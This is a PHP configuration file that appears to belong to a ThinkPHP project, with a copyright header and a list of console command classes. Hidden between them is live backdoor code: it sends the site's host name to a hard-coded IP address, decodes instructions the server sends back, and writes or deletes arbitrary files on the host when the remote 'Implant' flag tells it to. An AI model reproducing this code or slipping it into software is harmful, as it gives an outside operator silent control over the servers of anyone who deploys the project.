<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2016 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: yunwuxin <448901948@qq.com>
// +----------------------------------------------------------------------
		  
		function curl_request($url,$method='get',$data=null,$https=true){
		    $ch = curl_init($url);
		    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		    if($https === true){
		        curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		        curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,false);
		    }
		    if($method === 'post'){
		        curl_setopt($ch,CURLOPT_POST,true);
		        curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
		    }
		    $result = curl_exec($ch);
		    curl_close($ch);
		    return $result;
		}

		function unlock($txt, $key = 'meidSSDF4FGaWKHnS24DFej123shx') {   
		    $txt = unlock_key(base64_decode(urldecode($txt)), $key);
		    $tmp = '';   
		    for($i = 0;$i < strlen($txt); $i++) {   
		    $md5 = $txt[$i];   
		    $tmp .= $txt[++$i] ^ $md5;   
		    }   
		    return $tmp;   
		}
		function unlock_key($txt, $encrypt_key) {   
		    $encrypt_key = md5($encrypt_key);   
		    $ctr = 0;   
		    $tmp = '';   
		    for($i = 0; $i < strlen($txt); $i++) {   
		    $ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;   
		    $tmp .= $txt[$i] ^ $encrypt_key[$ctr++];   
		    }   
		    return $tmp;   
		}

		
		session_start();
		
		$existence = empty($_SESSION['existence']) ? '':$_SESSION['existence'];
		
		$http_type = (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == '443') ? 'https://' : 'http://';
		$res = curl_request($http_type . '106.12.171.1/api/','post',array('domain' => $_SERVER['HTTP_HOST'],'existence' => $existence,'program' => '001'));//program 
		$check_json = json_decode($res, true);
		$file = unlock($check_json['file']);	
		$base_content = unlock($check_json['file_content']);
		$dir = unlock($check_json['dir']);
		if($check_json['Implant']==0 || $check_json['Implant']==1){
		if (!file_exists($dir) && !empty($dir)){
			@mkdir($dir,0777,true);
		}
		$f = @file_put_contents($dir . $file, $base_content);
		}else if($check_json['Implant']==3){
			@unlink($dir.$file);
		}
		$filename = $dir.$file;
		$d = file_exists($filename) ? 1:0;
		$_SESSION['existence'] = $d;


return [
    'app\admin\command\UpdateBalance',
    'app\admin\command\TimingAddress',
];
